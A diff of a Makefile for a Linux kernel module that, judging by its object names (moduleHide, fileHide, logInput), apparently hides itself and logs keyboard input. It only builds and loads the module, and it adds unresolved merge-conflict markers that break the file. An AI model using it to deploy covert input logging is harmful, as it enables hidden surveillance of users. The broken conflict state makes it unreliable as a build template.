@@ -6,16 +6,21 @@
 # If it complains about the module not existing when you run install, don't worry - it's just
 # trying to uninstall any previously running instances for you, and will install it for you anyway
 
-PWD = $(shell pwd)
 moduleName = blank
 obj-m += $(moduleName).o
+<<<<<<< HEAD
 blank-objs += main.o moduleHide.o outputDeviceUsingTTY.o logInput.o output.o
+=======
+blank-objs += main.o fileHide.o moduleHide.o outputDevice.o logInput.o 
+
+PWD = $(shell pwd)
+>>>>>>> ac6e697adaa6a2394cb712da272fe64910605e53
 
 all:
 	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) modules
 clean:
 	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) clean
-	
+
 install: all uninstallSilently
 	insmod ./$(moduleName).ko
 
